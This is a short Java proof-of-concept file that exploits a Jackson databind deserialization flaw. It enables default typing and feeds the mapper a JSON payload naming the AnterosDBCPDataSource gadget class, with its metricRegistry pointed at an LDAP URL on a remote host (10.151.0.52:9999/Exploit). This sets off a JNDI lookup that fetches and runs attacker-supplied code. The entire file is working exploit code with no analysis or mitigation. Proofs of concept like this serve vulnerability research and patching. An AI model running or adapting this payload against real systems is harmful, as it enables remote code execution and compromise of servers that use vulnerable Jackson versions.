import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;


public class poc {

    public static void main(String args[]){
        ObjectMapper mapper = new ObjectMapper();

        mapper.enableDefaultTyping();
        String json = "[\"br.com.anteros.dbcp.AnterosDBCPDataSource\", {\"metricRegistry\":\"ldap://10.151.0.52:9999/Exploit\"}]";


        try{

            mapper.readValue(json,Object.class);

        }catch (IOException e){
            e.printStackTrace();
        }
    }
}
